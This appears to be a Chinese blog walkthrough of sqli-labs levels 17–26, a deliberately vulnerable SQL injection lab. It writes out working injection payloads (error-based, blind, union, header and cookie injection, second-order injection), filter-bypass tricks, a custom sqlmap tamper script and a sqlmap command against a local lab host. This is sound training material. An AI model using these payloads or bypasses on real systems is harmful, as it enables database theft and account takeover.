+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> users(`username`, `password`) <span class="keyword">VALUES</span> (<span class="string">&#x27;test\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>php代码中转义了单引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以正确处理username中的单引号，输入username如下，不要反引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+
+<p>密码随便来一个，提交后发现，所有用户密码全被改了，注入成功</p>
+<p>不过想要数据库中存在一条数据为 <code>test&#39; or 1=1#</code> 比较困难，得配合其他网页尝试插入这条数据</p>
+<h1 id="less-18（User-Agent）"><a href="#less-18（User-Agent）" class="headerlink" title="less-18（User-Agent）"></a>less-18（User-Agent）</h1><p>输入正常的用户名和密码，发现此网页会打印 user agent 的值，User-Agent 是http请求头的一个字段。查看源码，发现他会把 user agent 和 ip 地址插入数据库，类似一个日志功能，发生注入问题的代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>有报错信息，可以报错注入。不想开burp suite，所以用 hackbar 改变 User-Agent。登录时需要使用正确的用户密码，先登录一次，在f12开发者工具里的 network 中抓个包，看一看post请求体的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>hackbar 中的 enctype 应该和请求头中的 Content-Type 一样</p>
+<p>设置好 url ，启用 post 方法，但我设置请求体时，submit&#x3D;Submit 要去掉，不去掉 hackbar 报错，不太清楚是什么原因。submit字段也用不到，直接去掉就好，最后请求体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin</span><br></pre></td></tr></table></figure>
+
+<p>设置 User-Agent</p>
+<p>报错注入sql语句不能有语法错误，values 后面的字段数量必须和 values 前面一样，不清楚 user agent 后面还有没有别的字段的话，可以多尝试几次，最后尝试到没有报错的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc&#x27;, &#x27;112&#x27;, &#x27;asd&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>报错注入如下，选一个字段换成那几个就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc&#x27;, extractvalue(0x0a,concat(0x0a,(select database()))), &#x27;asd&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;), (&#x27;1&#x27;,&#x27;2&#x27;,extractvalue(0x0a,concat(0x0a,(select database()))))#</span><br></pre></td></tr></table></figure>
+
+<p>适用于user agent 是插入的最后一个字段</p>
+<p>时间盲注可行，布尔盲注应该不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;), (&#x27;1&#x27;,&#x27;2&#x27;,if(1=1, sleep(3), 0))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>跟 less-18 类似，User-Agent 换成了 Referer。Referer 也是请求头中的一个字段，据说这个单词正确写法是referrer，但是以前写错了，所以就沿用了 Referer。</p>
+<p>除了插入的列数不一样，其他都一样</p>
+<p>报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;), (&#x27;1&#x27;,extractvalue(0x0a,concat(0x0a,(select database()))))#</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;), (&#x27;1&#x27;,if(1=1, sleep(3), 0))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>post方法提交表单后，设置cookie，重定向到get方法请求的 index.php ，提交表单后重定向到get方法请求的页面是一种比较常见的做法，可以防止刷新时重复提交表单。发送请求时，如果请求的是一个目录，会自动寻找目录中的 index 文件，如 index.html , index.php之类的</p>
+<p> cookie 也可以在 http请求头中找到，也可以在其他地方查看。临时改变 cookie ，可以在hackbar中改变 cookie 字段的值。若是要持久修改cookie，谷歌浏览器插件 Edit This Cookie 可以比较方便的修改cookie。</p>
+<p>hackbar中，cookie值改为如下所示，可以采用联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<p>报错信息也有</p>
+<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>看标题有个base64，使用admin登录，发现cookie是 <code>YWRtaW4%3D</code> base64编码最后可能出现等号，%3D 应该是 &#x3D; 的 url 编码，拿 <code>YWRtaW4=</code> 去解码，发现就是 admin</p>
+<p>拿 Edit This Cookie 改cookie 改完后刷新网页。（后面试出来多个了圆括号）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<p>拿去base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==</span><br></pre></td></tr></table></figure>
+
+<p>等号换成  <code>%3D</code> ，cookie 中的 uname 改为如下值 （不换好像也行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>成了</p>
+<p>cookie中等号不用url编码也能正确处理，用了好像也行</p>
+<p>看了一眼代码，没看到手动处理url编码的函数，wireshark 抓包也没看出什么，不管了</p>
+<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=IiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMj</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-23（过滤注释符）"><a href="#less-23（过滤注释符）" class="headerlink" title="less-23（过滤注释符）"></a>less-23（过滤注释符）</h1><p>过滤了注释符 # 和 – 。有报错信息，需要构造出一个没有语法错误的sql语句才可以使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; or extractvalue(0x0a,concat(0x0a,(select database()))) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; or if(1=1, sleep(3), 0) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; or if(1=1, 1, 0) or &#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>（union后面没有from不能接where）联合查询，只有 2 能回显，或者 %00 截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,2,3 or &#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,3 from information_schema.tables where &#x27;1</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,3;%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>后来网上找到了一个有意思的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">||</span><span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这在mysql中可以正确执行，但是第三个字段从3变成了1，好像不管||后面是什么都是1</p>
+<p>再试了一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>后来又看到了 %00 截断sql语句，不知道对版本有没有什么要求</p>
+<h1 id="less-24（二次注入）"><a href="#less-24（二次注入）" class="headerlink" title="less-24（二次注入）"></a>less-24（二次注入）</h1><p>不知道什么原因 php文件少了几个，就先到这吧</p>
+<p>未完待续。。。</p>
+<p>后来发现这关和另一关有几个文件，文件名只有首字母大小写不一样（好像就24和40），windows中文件名好像不分大小写，导致文件名重复（win10 解压时提示临时文件文件名重复了）。</p>
+<hr>
+
+<p>标题 second degree injections ，二次注入（好像也有叫 二阶注入的）</p>
+<p>和 less-17 我发现的二次注入一样，只不过这次多了个可以自己插入数据的页面，就不需要自己直接在mysql中插入数据了</p>
+<p>创建新用户（插入数据）相关代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>修改密码相关代码，登陆时直接将用户名放到 $_SESSION[“username”] 中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，update语句中，使用了从数据库中查询出来的，没有过滤（转义）的数据，来拼接成为新的 sql 语句。所以此处可能存在二次注入</p>
+<p>二次注入简单举个例子，假设我们创建一个用户，用户名为 <code>  &#39; or 1=1#</code> ，因为插入之前单引号经过转义，所以生成的sql语句是（假设密码为 123）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert into</span> users ( username, password) <span class="keyword">values</span>(&quot;\&#x27; or 1=1#&quot;, &quot;123&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>此时再从数据库中获取刚插入的数据，用户名为 <code> &#39; or 1=1#</code> ，转义时生成的反引号就没了，如果此时我们将密码修改为 456，生成的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;456&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以修改所有用户的密码，当然想要只修改一个用户的也可以做到，比如 admin，注册时用户名为 <code>admin&#39;#</code> 即可</p>
+<h1 id="less-25（过滤-and-和-or，大小写不敏感，tamper）"><a href="#less-25（过滤-and-和-or，大小写不敏感，tamper）" class="headerlink" title="less-25（过滤 and 和 or，大小写不敏感，tamper）"></a>less-25（过滤 and 和 or，大小写不敏感，tamper）</h1><p>过滤 and 和 or，大小写不敏感</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解决办法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> =&gt; ||</span><br><span class="line"><span class="keyword">and</span> =&gt; &amp;&amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者双写绕过</span></span><br></pre></td></tr></table></figure>
+
+<p>用运算符代替and和or有一个问题，比如 information 这个单词会被过滤成 infmation，or即使不是用作或运算也会过滤掉，不知道这种怎么处理（感觉这种过滤不是很合理，正常的输入都可能会被过滤掉。正则表达式可能可以改进）</p>
+<p>这种把关键字替换成空字符串，如果只替换一次（不是一直替换，直到最终字符串中没有那些关键字为止），双写就可以绕过，比如  AANDND 过滤后为 AND</p>
+<p>sqlmap 如果加上 tamper 就能绕过这些过滤。tamper 是用来绕过过滤的（waf），比如将空格替换成 &#x2F;**&#x2F; 绕过空格过滤。less-25 双写绕过，网上说有个tamper 脚本叫 nonrecursivereplacement.py 非递归替换，意思挺明了的，好像效果就是双写绕过，但我没有在我下载的 sqlmap 的 tamper 目录中找到这个脚本，只找到了 symboliclogical ，就那个有问题的方法。不知道是要额外去哪下载tamper，还是因为版本更新删除了这个。</p>
+<p>因为 or &#x3D;&gt; || 和 or &#x3D;&gt; oorr 很像，而且 sqlmap 的payload中，and和or一般都是大写，于是我直接拿 symboliclogical.py 改成了or和and双写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    double write, OR =&gt; OORR , AND =&gt; AANDND</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span></span><br><span class="line"><span class="string">    &quot;1 AANDND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;AANDND&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;OR&#x27;</span>, <span class="string">&#x27;OORR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>只要改变tamper中的代码，文件名为 mydoublewrite.py 。避免使用耗费大量时间的时间盲注，指定注入的方法（联合注入，报错注入，布尔注入，堆叠注入），–tamper 指定 tamper</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-25/?id=123 --tamper=mydoublewrite --technique=UEBS -D security --tables</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>好像就字符型换成了数字型，sqlmap使用命令与less-25相同</p>
+<h1 id="less-26（过滤空白、-、注释）"><a href="#less-26（过滤空白、-、注释）" class="headerlink" title="less-26（过滤空白、&#x2F;**&#x2F;、注释）"></a>less-26（过滤空白、&#x2F;**&#x2F;、注释）</h1><p>先看一眼过滤了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了前两个（and和or），其他过滤的关键字都是放在中括号中的，表示只要有中括号中的字符就替换成空（php的正则表达式不太熟，python中应该是这样的，四个反斜杠表示替换一个反斜杠，这么多是因为要转义），所以是单字符被替换掉，无法使用双写绕过。</p>
+<p>过滤空格本来可以使用 <code>/**/</code> 绕过，但这里 * 和 &#x2F; 都过滤了。还可以用括号绕过，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3  =&gt;  select(1,2,3)</span><br></pre></td></tr></table></figure>
+
+<p>本关可以用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;aandnd(extractvalue(0x0a,concat(0x0a,(select(database())))))aandnd&#x27;</span><br><span class="line"></span><br><span class="line">?id=&#x27;aandnd(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(infoorrmation_schema.columns)))aandnd&#x27;</span><br><span class="line"></span><br><span class="line">?id=&#x27;aandnd(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)aandnd(table_name=&#x27;users&#x27;)))))aandnd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>联合注入（<del>and换成了&amp;&amp;就报错了？</del> 应该是要url编码）用零字节截断后面的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;union(select(1),group_concat(column_name),(3)from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)aandnd(table_name=&#x27;users&#x27;));%00</span><br></pre></td></tr></table></figure>
+
+
+
+<p>盲注看26a</p>
+<p>这关过滤的是空白，不止空格，空白还包括水平制表符（\t %09）换行等</p>
+<h1 id="绕过空白过滤"><a href="#绕过空白过滤" class="headerlink" title="绕过空白过滤"></a>绕过空白过滤</h1><p>适用于mysql，其他dbms没怎么研究</p>
+<p>用sqli-labs中的users表来举例子</p>
+<h2 id="1、用-代替"><a href="#1、用-代替" class="headerlink" title="1、用 /**/ 代替"></a>1、用 <code>/**/</code> 代替</h2><p>&#x2F;* 和 *&#x2F;中间的内容为注释</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">USER</span>(),DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这种如果要写脚本比较简单，空格和&#x2F;**&#x2F;是一一对应的</p>
+<h2 id="2、圆括号"><a href="#2、圆括号" class="headerlink" title="2、圆括号"></a>2、圆括号</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(<span class="number">1</span>),(<span class="number">2</span>),(<span class="number">3</span>)<span class="keyword">FROM</span>(users);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(username),(password)<span class="keyword">from</span>(users)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>(username),(password)<span class="keyword">FROM</span>(users)<span class="keyword">WHERE</span>(id<span class="operator">=</span><span class="number">-1</span>)<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(GROUP_CONCAT(COLUMN_NAME)),(<span class="number">2</span>)<span class="keyword">FROM</span>(information_schema.columns)<span class="keyword">WHERE</span>(table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="keyword">AND</span>(TABLE_NAME<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3、反引号"><a href="#3、反引号" class="headerlink" title="3、反引号"></a>3、反引号</h2><p>反引号 (&#96;) 在mysql中用于区分保留字和一般的字符串，反引号中的字符串一般是列名或者表名，反引号中的关键字不会被认为是关键字，比如反引号中的函数不会执行，感觉局限性比较大</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>`username`,`password`<span class="keyword">FROM</span>`users`;</span><br></pre></td></tr></table></figure>
+
+<p>有些dbms好像用的是中括号[ ]</p>
+<h2 id="4、一种mysql中比较特殊的注释"><a href="#4、一种mysql中比较特殊的注释" class="headerlink" title="4、一种mysql中比较特殊的注释"></a>4、一种mysql中比较特殊的注释</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*! xxxxx select 1,2,3*/</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 xxxxx （5位） 代表mysql的版本号，只要使用的mysql版本号比 xxxxx 大，就执行注释中的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span><span class="comment">/*!00000username,password*/</span><span class="keyword">FROM</span><span class="comment">/*!00000users*/</span>;</span><br></pre></td></tr></table></figure>
+
+
+
